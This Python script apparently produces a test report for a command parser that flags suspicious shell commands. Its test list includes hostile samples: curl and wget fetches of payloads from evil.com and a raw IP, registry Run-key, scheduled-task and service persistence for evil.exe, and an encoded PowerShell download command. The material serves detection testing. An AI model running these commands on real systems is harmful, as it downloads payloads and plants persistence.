#!/usr/bin/env python3
"""
test_report_detailed.py — Generate detailed test report with command → parser → semantic outputs
"""

import json
import sys
from parser import parse_command
from semantic_features import build_semantic_features

def format_output(label, data):
    """Format output nicely"""
    if isinstance(data, dict):
        return json.dumps(data, indent=2)
    elif isinstance(data, list):
        return json.dumps(data, indent=2)
    else:
        return str(data)

def run_detailed_report():
    tests = [
        # Benign
        ("whoami", {}),
        ("pwd", {}),
        
        # Network/Download
        ("curl http://1.2.3.4/install.sh", {}),
        ("curl -o payload.exe http://1.2.3.4/payload.exe", {}),
        ("wget http://evil.com:8080/drop.sh", {}),
        
        # Admin/Persistence
        (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f", {}),
        (r"schtasks /create /tn updater /tr evil.exe /sc onlogon", {}),
        
        # Archive
        ("tar -czf backup.tar.gz /home/user/data", {}),
        ("unzip archive.zip -d /tmp/output", {}),
        
        # Operators
        ("cat /etc/passwd | grep root", {}),
        ("echo hello > output.txt", {}),
        ("mkdir /tmp/work && cd /tmp/work", {}),
        
        # Encoded/Obfuscated
        ("powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==", {}),
        ("python3 -c \"print('hello world')\"", {}),
        ("bash -c 'id && uname -a'", {}),
        
        # Remote
        ("ssh user@192.168.1.10", {}),
        ("scp file.txt user@remote:/home/user/", {}),
        
        # Service control
        ("systemctl enable nginx", {}),
        ("sc create updater binPath= C:\\Users\\Public\\evil.exe", {}),
    ]
    
    for i, (command, _) in enumerate(tests, 1):
        print(f"\n{'='*80}")
        print(f"TEST #{i}")
        print(f"{'='*80}\n")
        
        print(f"COMMAND:\n  {command}\n")
        
        # Parse
        parsed = parse_command(command)
        
        # Key parser fields
        print("PARSER OUTPUT (key fields):")
        key_fields = {
            "executable": parsed.get("executable"),
            "platform": parsed.get("platform"),
            "subcommand": parsed.get("subcommand"),
            "flags": parsed.get("flags"),
            "urls": parsed.get("urls"),
            "ips": parsed.get("ips"),
            "domains": parsed.get("domains"),
            "file_paths": parsed.get("file_paths"),
            "registry_paths": parsed.get("registry_paths"),
            "remote_targets": parsed.get("remote_targets"),
            "has_pipe": parsed.get("has_pipe"),
            "has_redirect": parsed.get("has_redirect"),
            "has_chain": parsed.get("has_chain"),
            "interpreter_markers": parsed.get("interpreter_markers"),
            "encoded_markers": parsed.get("encoded_markers"),
            "obfuscation_markers": parsed.get("obfuscation_markers"),
            "archive_indicators": parsed.get("archive_indicators"),
            "lolbin_matches": parsed.get("lolbin_matches"),
            "inline_code": parsed.get("inline_code"),
            "deobfuscated_command": parsed.get("deobfuscated_command"),
        }
        print(json.dumps(key_fields, indent=2))
        
        # Semantic features
        feats = build_semantic_features(parsed)
        
        print("\nSEMANTIC FEATURES (active flags):")
        active_features = [k for k, v in feats.items() 
                          if isinstance(v, bool) and v and k != "feature_tags"]
        if active_features:
            for feat in active_features:
                print(f"  ✓ {feat}")
        else:
            print("  (none)")
        
        print()

if __name__ == "__main__":
    run_detailed_report()
